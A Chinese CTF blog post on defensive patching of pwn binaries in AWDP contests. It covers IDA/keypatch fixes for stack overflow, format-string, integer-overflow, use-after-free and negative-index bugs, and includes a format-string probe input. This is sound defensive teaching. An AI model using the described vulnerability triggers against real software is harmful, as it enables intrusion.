@@ -1,0 +1,761 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css" integrity="sha256-dABdfBfUoC8vJUBOwGVdm8L9qlMWaHTIfXt+7GnZCIo=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"le0n-daily.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.22.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"copycode":{"enable":true,"style":"mac","show_result":true},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false,"trigger":"auto"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="pwn题目patch技巧、19th_ciscn的minihttpd">
+<meta property="og:type" content="article">
+<meta property="og:title" content="awdp-pwn-patch技巧+一些题目">
+<meta property="og:url" content="https://le0n-daily.github.io/awdp/index.html">
+<meta property="og:site_name" content="le0n-blog">
+<meta property="og:description" content="pwn题目patch技巧、19th_ciscn的minihttpd">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://le0n-daily.github.io/images/image-20260319101317587.png">
+<meta property="og:image" content="https://le0n-daily.github.io/images/image-20260319101421681.png">
+<meta property="og:image" content="https://le0n-daily.github.io/images/image-20260319101638303.png">
+<meta property="og:image" content="https://le0n-daily.github.io/images/image-20260319111016256.png">
+<meta property="og:image" content="https://le0n-daily.github.io/images/image-20260319112014041.png">
+<meta property="og:image" content="https://le0n-daily.github.io/images/image-20260319112447024.png">
+<meta property="og:image" content="https://le0n-daily.github.io/images/image-20260319112541716.png">
+<meta property="og:image" content="https://le0n-daily.github.io/images/image-20260319125355505.png">
+<meta property="og:image" content="https://le0n-daily.github.io/images/image-20260319125425307.png">
+<meta property="og:image" content="https://le0n-daily.github.io/images/image-20260319125812137.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/7c1a010bfba10945cab6af55d3956d06.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/1fcdb73627ee722c810662e9abcfc1c3.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/fa56c97804c92518c3fa2341397075de.png">
+<meta property="og:image" content="https://le0n-daily.github.io/images/image-20260319221520208.png">
+<meta property="og:image" content="https://le0n-daily.github.io/images/image-20260319222227066.png">
+<meta property="og:image" content="https://le0n-daily.github.io/images/image-20260319220840349.png">
+<meta property="og:image" content="https://le0n-daily.github.io/images/image-20260319225350035.png">
+<meta property="og:image" content="https://le0n-daily.github.io/images/8818287573bdd01fde7db0a965ddd3bd.png">
+<meta property="og:image" content="https://le0n-daily.github.io/images/079028b968d4714bbdc60a33d378cad5.png">
+<meta property="og:image" content="https://le0n-daily.github.io/images/032b0617a243a682eab518c60bfaa647.png">
+<meta property="og:image" content="https://le0n-daily.github.io/images/image-20260320155051227.png">
+<meta property="og:image" content="https://le0n-daily.github.io/images/image-20260320160909693.png">
+<meta property="og:image" content="https://le0n-daily.github.io/images/image-20260320161543885.png">
+<meta property="og:image" content="https://le0n-daily.github.io/images/image-20260320163752481.png">
+<meta property="article:published_time" content="2026-03-19T01:00:00.000Z">
+<meta property="article:modified_time" content="2026-04-25T09:19:04.107Z">
+<meta property="article:author" content="leon">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="awdp">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://le0n-daily.github.io/images/image-20260319101317587.png">
+
+
+<link rel="canonical" href="https://le0n-daily.github.io/awdp/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://le0n-daily.github.io/awdp/","path":"awdp/","title":"awdp-pwn-patch技巧+一些题目"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>awdp-pwn-patch技巧+一些题目 | le0n-blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+<link rel="alternate" href="/atom.xml" title="le0n-blog" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">le0n-blog</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">17</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">10</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">36</span></a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="Searching..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#patch"><span class="nav-number">1.</span> <span class="nav-text">patch</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#patch%E8%B5%84%E6%96%99"><span class="nav-number">1.1.</span> <span class="nav-text">patch资料</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A0%88%E6%BA%A2%E5%87%BA-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="nav-number">1.2.</span> <span class="nav-text">栈溢出+格式化字符串</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA"><span class="nav-number">1.3.</span> <span class="nav-text">整数溢出</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#uaf"><span class="nav-number">1.4.</span> <span class="nav-text">uaf</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%95%B0%E7%BB%84%E8%B6%8A%E7%95%8C%E8%B4%9F%E7%B4%A2%E5%BC%95%E7%9A%84%E9%97%AE%E9%A2%98"><span class="nav-number">1.5.</span> <span class="nav-text">数组越界负索引的问题</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#if"><span class="nav-number">1.6.</span> <span class="nav-text">if</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">1.7.</span> <span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#minihttpd"><span class="nav-number">2.</span> <span class="nav-text">minihttpd</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90%EF%BC%9A"><span class="nav-number">2.1.</span> <span class="nav-text">漏洞解析：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BC%80%E5%A7%8B%E6%B5%8B%E8%AF%95"><span class="nav-number">2.2.</span> <span class="nav-text">开始测试</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%95%B4%E7%90%86%E6%80%9D%E8%B7%AF"><span class="nav-number">2.3.</span> <span class="nav-text">整理思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp"><span class="nav-number">2.4.</span> <span class="nav-text">exp</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%B6%E8%8E%B7"><span class="nav-number">2.5.</span> <span class="nav-text">收获</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="leon"
+      src="/images/avatar.gif">
+  <p class="site-author-name" itemprop="name">leon</p>
+  <div class="site-description" itemprop="description">Take more notes to reach higher efficiency.</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">36</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">17</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/le0n-daily" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;le0n-daily" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:1192876128@qq.com" title="E-Mail → mailto:1192876128@qq.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/en" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://le0n-daily.github.io/awdp/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="leon">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="le0n-blog">
+      <meta itemprop="description" content="Take more notes to reach higher efficiency.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="awdp-pwn-patch技巧+一些题目 | le0n-blog">
+      <meta itemprop="description" content="pwn题目patch技巧、19th_ciscn的minihttpd">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          awdp-pwn-patch技巧+一些题目
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2026-03-19 09:00:00" itemprop="dateCreated datePublished" datetime="2026-03-19T09:00:00+08:00">2026-03-19</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2026-04-25 17:19:04" itemprop="dateModified" datetime="2026-04-25T17:19:04+08:00">2026-04-25</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">Views: </span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="Word count in article">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">Word count in article: </span>
+      <span>9.3k</span>
+    </span>
+    <span class="post-meta-item" title="Reading time">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">Reading time &asymp;</span>
+      <span>8 mins.</span>
+    </span>
+</div>
+
+            <div class="post-description">pwn题目patch技巧、19th_ciscn的minihttpd</div>
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><blockquote>
+<p>2026.4.25更新：推荐大家用AwdPwnPatcher这个github的python库，因为近几次awdp的uaf修改都是那个标准，而且像在ida中添加字符串这种东西，在这个工具中已经写好了，无需手动坐牢添加，呜呜~~</p>
+</blockquote>
+<h2 id="patch"><a href="#patch" class="headerlink" title="patch"></a>patch</h2><ul>
+<li><p>工具</p>
+<ul>
+<li><code>IDA</code></li>
+<li><code>IDA的keypatch插件</code>这个好像是自带的</li>
+</ul>
+</li>
+</ul>
+<h3 id="patch资料"><a href="#patch资料" class="headerlink" title="patch资料"></a><strong>patch资料</strong></h3><p> <strong>跳转指令</strong></p>
+<ul>
+<li>无符号跳转</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>汇编指令</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>JA</td>
+<td>无符号大于则跳转</td>
+</tr>
+<tr>
+<td>JNA</td>
+<td>无符号不大于则跳转</td>
+</tr>
+<tr>
+<td>JAE</td>
+<td>无符号大于等于则跳转（同JNB）</td>
+</tr>
+<tr>
+<td>JNAE</td>
+<td>无符号不大于等于则跳转（同JB）</td>
+</tr>
+<tr>
+<td>JB</td>
+<td>无符号小于则跳转</td>
+</tr>
+<tr>
+<td>JNB</td>
+<td>无符号不小于则跳转</td>
+</tr>
+<tr>
+<td>JBE</td>
+<td>无符号小于等于则跳转（同JNA）</td>
+</tr>
+<tr>
+<td>JBNE</td>
+<td>无符号不小于等于则跳转（同JA）</td>
+</tr>
+</tbody></table>
+<ul>
+<li>有符号跳转</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>汇编指令</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>JG</td>
+<td>有符号大于则跳转</td>
+</tr>
+<tr>
+<td>JNG</td>
+<td>有符号不大于则跳转</td>
+</tr>
+<tr>
+<td>JGE</td>
+<td>有符号大于等于则跳转（同JNL）</td>
+</tr>
+<tr>
+<td>JNGE</td>
+<td>有符号不大于等于则跳转（同JL）</td>
+</tr>
+<tr>
+<td>JL</td>
+<td>有符号小于则跳转</td>
+</tr>
+<tr>
+<td>JNL</td>
+<td>有符号不小于则跳转</td>
+</tr>
+<tr>
+<td>JLE</td>
+<td>有符号小于等于则跳转（同JNG）</td>
+</tr>
+<tr>
+<td>JNLE</td>
+<td>有符号不小于等于则跳转（同JG）</td>
+</tr>
+</tbody></table>
+<h3 id="栈溢出-格式化字符串"><a href="#栈溢出-格式化字符串" class="headerlink" title="栈溢出+格式化字符串"></a>栈溢出+格式化字符串</h3><p>函数漏洞如下：</p>
+<img src="../images/image-20260319101317587.png" alt="image-20260319101317587" style="zoom:50%;" />
+
+<ul>
+<li>read栈溢出的话就直接改大小就可以了，右键–&gt; Assemble功能直接改汇编–&gt;回车即可完成–&gt;f5重新反编译，然后保存即可成功</li>
+</ul>
+<img src="../images/image-20260319101421681.png" alt="image-20260319101421681" style="zoom:33%;" />
+
+<ul>
+<li>printf(format)—&gt;puts(format)，和前面一样的操作通过改汇编call _printf—&gt;call _puts前提是有puts函数（可能不通过）</li>
+</ul>
+<img src="../images/image-20260319101638303.png" alt="image-20260319101638303" style="zoom: 33%;" />
+
+<ul>
+<li>无puts@plt，用%s，在eh_frame_hdr或eh_frame选一个地址<code>% 0x25; s 0x73</code>，patch选中的eh_frame_hdr地址，然后在edi&#x2F;rdi改为刚才填的%s的地址，改第二个参数esi&#x2F;rsi为第一个参数，这个找了一个64位的程序（随便找就行）</li>
+</ul>
+<img src="../images/image-20260319111016256.png" alt="image-20260319111016256" style="zoom:50%;" />
+
+<p>接下来赋值一份此处的机器码，在printf的lea命令处右键，这里需要注意此处的patch bytes中少显示了 call _printf 的机器码的最后一个 FF，先赋值Values中的全部机器码</p>
+<img src="../images/image-20260319112014041.png" alt="image-20260319112014041" style="zoom:50%;" />
+
+<p>然后把这段程序全部nop掉（从lea到call直接右键NOP），回到eh_frame选个地方修改字节码</p>
+<img src="../images/image-20260319112447024.png" alt="image-20260319112447024" style="zoom:50%;" />
+
+<p>并在末尾补上FF，</p>
+<img src="../images/image-20260319112541716.png" alt="image-20260319112541716" style="zoom:33%;" />
+
+<p>选中我们修改的这一部分指令，按一下C然后选择 ‘force’ 即可让它显示汇编指令，即使<strong>本题目开启pie</strong>也可以用jmp直接跳转，但是这里有一个问题就是把’%s’穿给rdi来做第一个参数，解决办法呢就是用rip来进行寻址传参此处命令：lea rdi,[rip-0x12]，而且此处质量长度有限可跳回text段续写指令，最终汇编代码效果如下：</p>
+<img src="../images/image-20260319125355505.png" alt="image-20260319125355505" style="zoom:50%;" />
+
+<img src="../images/image-20260319125425307.png" alt="image-20260319125425307" style="zoom: 50%;" />
+
+<p>这里有一些注意点：apply_patch 后重新打开文件反编译的printf处可能显示跳转中断，但代码是没问题的，把程序放入linux中仍可以执行，效果如下：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">le0n:<span class="built_in">test</span>/ $ checksec fix3       </span><br><span class="line">[*] <span class="string">&#x27;/home/le0n/goal/test/fix3&#x27;</span></span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Full RELRO</span><br><span class="line">    Stack:      Canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        PIE enabled</span><br><span class="line">    Stripped:   No</span><br><span class="line"></span><br><span class="line">le0n:<span class="built_in">test</span>/ $ ./fix3  </span><br><span class="line">Hello my bro.</span><br><span class="line">...</span><br><span class="line">&gt;&gt;1. leak</span><br><span class="line">2. fmt_attack</span><br><span class="line">3. get_flag</span><br><span class="line">4. <span class="built_in">exit</span></span><br><span class="line">&gt;&gt;2</span><br><span class="line">%s %p %p %p</span><br><span class="line">%s %p %p %p &lt;===== 注意这里</span><br><span class="line">...</span><br><span class="line">Bye!</span><br></pre></td></tr></table></figure>
+
+<p>gdb调试截断，可以看到成功运行到我们修改的代码中：</p>
+<img src="../images/image-20260319125812137.png" alt="image-20260319125812137" style="zoom:67%;" />
+
+<p>注：堆溢出也就同理了，找到对应给chunk赋值的函数限制它的大小即可</p>
+<h3 id="整数溢出"><a href="#整数溢出" class="headerlink" title="整数溢出"></a>整数溢出</h3><p><img src="https://i-blog.csdnimg.cn/blog_migrate/7c1a010bfba10945cab6af55d3956d06.png" alt="img"></p>
+<p>Scanf 以 long int 长整形读取输入到 unsigned int 变量 v2 中，然后将 v2 强制转为 int 再与int 48 比较。</p>
+<p>但从 scanf 读入一个负数时，最高位为 1 ，从 unsigned int 强制转换为 int 结果是负数，必定比 48 小，在后面 read 读入会造成栈溢出。</p>
+<p><strong>Patch方法</strong><br>将第 9 行的 if 跳转汇编指令 patch 为无符号的跳转指令，具体指令参考跳转指令。</p>
+<p>使用 keypatach 进行修改：<code>jle --&gt; jbe</code></p>
+<p><img src="https://i-blog.csdnimg.cn/blog_migrate/1fcdb73627ee722c810662e9abcfc1c3.png" alt="img"></p>
+<p><img src="https://i-blog.csdnimg.cn/blog_migrate/fa56c97804c92518c3fa2341397075de.png" alt="img"></p>
+<h3 id="uaf"><a href="#uaf" class="headerlink" title="uaf"></a>uaf</h3><p><a target="_blank" rel="noopener" href="https://github.com/CTF-Archives/2024-CISCN-Finals-AWDP/releases/download/1.0/AWDP-PWN-ezheap.zip">题目链接</a></p>
+<p>首先通过 shift+f7 确认eh_frame段的执行权限，如果只读参考下面这张图片进行修改</p>
+<img src="../images/image-20260319221520208.png" alt="image-20260319221520208" style="zoom:67%;" />
+
+<p>修改逻辑是劫持 call 指令跳转到 .eh_frame 段上写入的自定义汇编程序，如下图</p>
+<img src="../images/image-20260319222227066.png" alt="image-20260319222227066" style="zoom:67%;" />
+
+<p>先在 .eh_frame 段上写入代码，首先是 call free 完成释放，然后对 chunk_list（这里就是这个A080） 进行置零。取 chunk_list 地址的汇编可以从 call free 前面抄过来：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">call 	_free;           #调用free函数（plt地址）</span><br><span class="line">mov     eax, [rbp-4]; #取出下标值</span><br><span class="line">cdqe;</span><br><span class="line">lea     rdx, ds:0[rax*8];</span><br><span class="line">lea 	rax, qword_A080;</span><br><span class="line"> </span><br><span class="line">mov 	r8,0; #段地址不能直接赋予立即数</span><br><span class="line">mov 	[rdx+rax],r8;</span><br><span class="line">jmp     locret_15D9; #跳回原来的地址</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/image-20260319220840349.png" alt="image-20260319220840349"></p>
+<h3 id="数组越界负索引的问题"><a href="#数组越界负索引的问题" class="headerlink" title="数组越界负索引的问题"></a>数组越界负索引的问题</h3><p>这是软件系统安全赛的一道pwn题目挺复杂的，只展示漏洞点吧</p>
+<p>**方案一：**直接修改变量类型为无符号整型变量，但是0依然可以输入，再exp利用中其实已经可以防御成功了</p>
+<p><img src="/../images/image-20260319225350035.png" alt="image-20260319225350035"></p>
+<p>**方案二：**让0也不行</p>
+<p>原始逻辑（有漏洞）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">2DAB  mov eax, [rbp+SrcId]</span><br><span class="line">2DAE  cmp eax, 0Ch</span><br><span class="line">2DB1  jg  short loc_2DFB</span><br><span class="line">2DB3  mov eax, [rbp+SrcId]</span><br><span class="line">2DB6  sub eax, 1</span><br><span class="line">2DB9  cdqe</span><br><span class="line">2DBB  lea rdx, [rax*8]</span><br><span class="line">2DC3  lea rax, ChunkList</span><br><span class="line">2DCA  mov rax, [rdx+rax]</span><br></pre></td></tr></table></figure>
+<p>这里只检查 SrcId &gt; 12 ，没检查 &lt;1 。</p>
+<p>所以 SrcId&#x3D;-3&#x2F;0 不会跳到 loc_2DFB ，继续 sub eax,1 后变成负索引，访问 ChunkList 越界。</p>
+<p>目标逻辑:</p>
+<ul>
+<li>要的是： if (SrcId &lt; 1 || SrcId &gt; 12) goto loc_2DFB;（但需要的命令长度超出此处范围）</li>
+<li>等价写法： t &#x3D; SrcId - 1; if ((unsigned)t &gt; 11) goto loc_2DFB;</li>
+</ul>
+<p>把 2DAE~2DB8 这 11 字节整体改掉：</p>
+<p>原来 11 字节是：</p>
+<ul>
+<li><p>cmp eax,0Ch (3)</p>
+</li>
+<li><p>jg short … (2)</p>
+</li>
+<li><p>mov eax,[rbp+SrcId] (3)</p>
+</li>
+<li><p>sub eax,1 (3)<br>改成新的 11 字节：</p>
+</li>
+<li><p>sub eax,1 (3)</p>
+</li>
+<li><p>cmp eax,0Bh (3)</p>
+</li>
+<li><p>ja short loc_2DFB (2)</p>
+</li>
+<li><p>nop (3) 即：</p>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">2DAB  mov eax, [rbp+SrcId]</span><br><span class="line">2DAE  sub eax, 1</span><br><span class="line">2DB1  cmp eax, 0Bh</span><br><span class="line">2DB4  ja  short loc_2DFB</span><br><span class="line">2DB6  nop</span><br><span class="line">2DB7  nop</span><br><span class="line">2DB8  nop</span><br><span class="line">2DB9  cdqe</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<p>这套为什么正确</p>
+<ul>
+<li>SrcId&#x3D;1 -&gt; eax&#x3D;0 ， 0 &gt; 11 ? 否，放行</li>
+<li>SrcId&#x3D;12 -&gt; eax&#x3D;11 ， 11 &gt; 11 ? 否，放行</li>
+<li>SrcId&#x3D;13 -&gt; eax&#x3D;12 ， 12 &gt; 11 ? 是，拦截</li>
+<li>SrcId&#x3D;0 -&gt; eax&#x3D;-1 （无符号是超大值）， ja 成立，拦截</li>
+<li>SrcId&#x3D;-3 -&gt; 同理， ja 成立，拦截<br>所以负数和 0 都被挡住了。</li>
+</ul>
+<h3 id="if"><a href="#if" class="headerlink" title="if"></a>if</h3><p>假设需要将图上第二个 if 放到 if 结构内，修改跳转的地址即可：</p>
+<p><img src="/../images/8818287573bdd01fde7db0a965ddd3bd.png" alt="img"></p>
+<p>原始跳转代码：</p>
+<p><img src="/../images/079028b968d4714bbdc60a33d378cad5.png" alt="img"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">js 0x40081C --&gt; js 0x400845</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/032b0617a243a682eab518c60bfaa647.png" alt="img"></p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p><strong>技巧</strong></p>
+<ul>
+<li>read()限制读入长度</li>
+<li>gets()将它的存储地址改为.bss上的，例如将栈地址改为<code>offest 0x602040</code></li>
+<li>格式化字符串<ul>
+<li>printf(format)—&gt;puts(format)，通过改汇编call _printf—&gt;call _puts前提是有puts函数</li>
+<li>无puts@plt，用%s，在eh_frame_hdr选一个地址<code>% 0x25; s 0x73</code>，patch选中的eh_frame_hdr地址，然后在edi&#x2F;rdi改为刚才填的%s的地址，改第二个参数esi&#x2F;rsi为第一个参数</li>
+</ul>
+</li>
+<li>uaf</li>
+<li>是在不行的话就nop一下试试</li>
+</ul>
